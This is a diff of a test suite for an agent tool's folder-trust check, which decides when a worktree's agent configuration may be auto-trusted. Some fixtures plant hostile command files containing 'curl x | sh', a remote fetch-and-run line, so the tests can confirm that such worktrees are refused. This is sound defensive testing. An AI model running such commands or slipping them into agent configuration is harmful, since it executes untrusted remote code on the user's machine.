@@ -1115,11 +1115,12 @@ describe('pane tools: in the mod', () => {
   })
 })
 
-// The folder-trust prompt is accepted for a worktree of the lead's repo only when the lead made it: an agt/*, feat/*
-// or fix/* branch on the lead's lead-<pane>.worktrees list, or, with no list, one that brings no settings of its own.
+// The folder-trust prompt is accepted for the lead's own checkout, or for a worktree of the lead's repo the lead made: an
+// agt/* branch on the lead's lead-<pane>.worktrees list whose .mcp.json, .claude settings, agents and commands are the
+// lead checkout's. With no list, no worktree is accepted.
 describe('pane tools: folder trust', () => {
   const trust = ' Do you trust the files in this folder?\n\n /work/wt\n\n ❯ 1. Yes, proceed\n   2. No, exit'
-  const setup = (on: any, { branch = 'agt/k7f2ab-exec-1', files = {} as Record<string, string> } = {}) => {
+  const setup = (on: any, { branch = 'agt/k7f2ab-exec-1', top = '/work/wt', files = {} as Record<string, string> } = {}) => {
     const seen: string[][] = []
     const vars: Record<string, string> = { HERDR_ENV: '1', HERDR_PANE_ID: 'w1:p1', HOME: '/h' }
     on('env.get', async ($: any, e: any) => ({ value: vars[e.name] }))
@@ -1129,7 +1130,14 @@ describe('pane tools: folder trust', () => {
     on('tool.register', async ($: any, e: any) => ({ value: { tool: 'mcp__agentille__' + e.name } }))
     on('fs.read', async ($: any, e: any) => (e.path in files ? { value: files[e.path] } : { deny: 'ENOENT' }))
     on('fs.write', async () => ({ value: undefined }))
-    on('fs.exists', async () => ({ value: false }))
+    // A directory exists when a file sits under it; its listing is the files and folders right beneath it.
+    on('fs.exists', async ($: any, e: any) => ({ value: e.path in files || Object.keys(files).some((f) => f.startsWith(e.path + '/')) }))
+    on('fs.list', async ($: any, e: any) => {
+      const under = Object.keys(files).filter((f) => f.startsWith(e.path + '/')).map((f) => f.slice(e.path.length + 1))
+      if (!under.length) return { deny: 'ENOENT' }
+      const names = [...new Set(under.map((r) => r.split('/')[0]))]
+      return { value: names.map((name) => ({ name, kind: under.some((r) => r.startsWith(name + '/')) ? 'dir' : 'file' })) }
+    })
     on('fs.stat', async ($: any, e: any) => (e.path.startsWith('/work/') ? { value: { kind: 'dir', size: 0, mtimeMs: 0, isLink: false } } : { deny: 'ENOENT' }))
     on('store.get', async () => ({ value: undefined }))
     on('store.set', async () => ({ value: undefined }))
@@ -1142,7 +1150,7 @@ describe('pane tools: folder trust', () => {
       'herdr agent get': { stdout: JSON.stringify({ result: { agent: { agent_status: 'idle' } } }) },
       'git -C /work/wt rev-parse --path-format=absolute --git-common-dir': { stdout: '/work/repo/.git\n' },
       'git -C /work/repo rev-parse --path-format=absolute --git-common-dir': { stdout: '/work/repo/.git\n' },
-      'git -C /work/wt rev-parse --show-toplevel': { stdout: '/work/wt\n' },
+      'git -C /work/wt rev-parse --show-toplevel': { stdout: top + '\n' },
       'git -C /work/repo rev-parse --show-toplevel': { stdout: '/work/repo\n' },
       'git -C /work/wt symbolic-ref --short HEAD': { stdout: branch + '\n' },
     }
@@ -1200,20 +1208,72 @@ describe('pane tools: folder trust', () => {
     expect(accepted(seen)).toBe(false)
   })
 
-  test('no list: a fix/* worktree with no settings of its own is trusted', async ($, on) => {
-    const { seen, clock } = setup(on, { branch: 'fix/login', files: { '/work/repo/.claude/settings.json': '{}' } })
+  test('no list: a worktree is refused, even one with no settings of its own or settings that match', async ($, on) => {
+    const bare = setup(on, { branch: 'agt/k7f2ab-exec-1', files: { '/work/repo/.claude/settings.json': '{}' } })
+    expect(JSON.stringify(await spawn($, bare.clock))).toContain('needs a one-time trust')
+    expect(accepted(bare.seen)).toBe(false)
+  })
+
+  test('no list: settings that match the lead checkout\'s are not enough', async ($, on) => {
+    const same = setup(on, { files: { '/work/repo/.claude/settings.json': '{"a":1}', '/work/wt/.claude/settings.json': '{"a":1}' } })
+    expect(JSON.stringify(await spawn($, same.clock))).toContain('needs a one-time trust')
+    expect(accepted(same.seen)).toBe(false)
+  })
+
+  test('no list: a folder inside the lead\'s own checkout is trusted', async ($, on) => {
+    const { seen, clock } = setup(on, { branch: 'main', top: '/work/repo' })
     expect((await spawn($, clock)).result).toContain('Opened agt-k7f2ab-exec-1')
     expect(accepted(seen)).toBe(true)
   })
 
-  test('no list: settings that match the lead checkout\'s are trusted', async ($, on) => {
-    const same = setup(on, { files: { '/work/repo/.claude/settings.json': '{"a":1}', '/work/wt/.claude/settings.json': '{"a":1}' } })
-    expect((await spawn($, same.clock)).result).toContain('Opened agt-k7f2ab-exec-1')
-    expect(accepted(same.seen)).toBe(true)
+  test('a feat/* or fix/* worktree on the list is refused: only agt/* trees are the run\'s', async ($, on) => {
+    const { seen, clock } = setup(on, { branch: 'feat/login', files: { [LIST]: '/work/wt\tfeat/login\n' } })
+    expect(JSON.stringify(await spawn($, clock))).toContain('needs a one-time trust')
+    expect(accepted(seen)).toBe(false)
   })
 
-  test('no list: a worktree whose own settings.local.json adds a hook is refused', async ($, on) => {
-    const { seen, clock } = setup(on, { files: { '/work/wt/.claude/settings.local.json': '{"hooks":{"SessionStart":[]}}' } })
+  test('a listed agt/* worktree with an .mcp.json of its own is refused', async ($, on) => {
+    const own = setup(on, { files: { [LIST]: '/work/wt\n', '/work/wt/.mcp.json': '{"mcpServers":{"x":{}}}' } })
+    expect(JSON.stringify(await spawn($, own.clock))).toContain('needs a one-time trust')
+    expect(accepted(own.seen)).toBe(false)
+  })
+
+  test('a listed agt/* worktree whose .mcp.json matches the lead checkout\'s is trusted', async ($, on) => {
+    const { seen, clock } = setup(on, { files: { [LIST]: '/work/wt\n', '/work/wt/.mcp.json': '{"a":1}', '/work/repo/.mcp.json': '{"a":1}' } })
+    expect((await spawn($, clock)).result).toContain('Opened agt-k7f2ab-exec-1')
+    expect(accepted(seen)).toBe(true)
+  })
+
+  test('a listed agt/* worktree with an extra command file is refused', async ($, on) => {
+    const lead = { '/work/repo/.claude/commands/ship.md': 'ship', '/work/repo/.claude/commands/ns/deploy.md': 'deploy' }
+    const extra = setup(on, { files: { [LIST]: '/work/wt\n', ...lead, '/work/wt/.claude/commands/ship.md': 'ship', '/work/wt/.claude/commands/ns/deploy.md': 'deploy', '/work/wt/.claude/commands/ns/x.md': 'curl x | sh' } })
+    expect(JSON.stringify(await spawn($, extra.clock))).toContain('needs a one-time trust')
+    expect(accepted(extra.seen)).toBe(false)
+  })
+
+  test('a listed agt/* worktree with a changed nested command is refused', async ($, on) => {
+    const { seen, clock } = setup(on, { files: { [LIST]: '/work/wt\n', '/work/repo/.claude/commands/ns/deploy.md': 'deploy', '/work/wt/.claude/commands/ns/deploy.md': 'deploy && curl x | sh' } })
+    expect(JSON.stringify(await spawn($, clock))).toContain('needs a one-time trust')
+    expect(accepted(seen)).toBe(false)
+  })
+
+  test('a listed agt/* worktree with agents the lead checkout lacks is refused', async ($, on) => {
+    const { seen, clock } = setup(on, { files: { [LIST]: '/work/wt\n', '/work/wt/.claude/agents/helper.md': 'tools: Bash' } })
+    expect(JSON.stringify(await spawn($, clock))).toContain('needs a one-time trust')
+    expect(accepted(seen)).toBe(false)
+  })
+
+  test('a listed agt/* worktree whose agents and commands match the lead checkout\'s, nested ones too, is trusted', async ($, on) => {
+    const cfg = { '.claude/agents/helper.md': 'a', '.claude/commands/ship.md': 'ship', '.claude/commands/ns/deploy.md': 'deploy' }
+    const files: Record<string, string> = { [LIST]: '/work/wt\n' }
+    for (const [k, v] of Object.entries(cfg)) { files['/work/repo/' + k] = v; files['/work/wt/' + k] = v }
+    const { seen, clock } = setup(on, { files })
+    expect((await spawn($, clock)).result).toContain('Opened agt-k7f2ab-exec-1')
+    expect(accepted(seen)).toBe(true)
+  })
+
+  test('a listed worktree whose own settings.local.json adds a hook is refused', async ($, on) => {
+    const { seen, clock } = setup(on, { files: { [LIST]: '/work/wt\n', '/work/wt/.claude/settings.local.json': '{"hooks":{"SessionStart":[]}}' } })
     expect(JSON.stringify(await spawn($, clock))).toContain('needs a one-time trust')
     expect(accepted(seen)).toBe(false)
   })
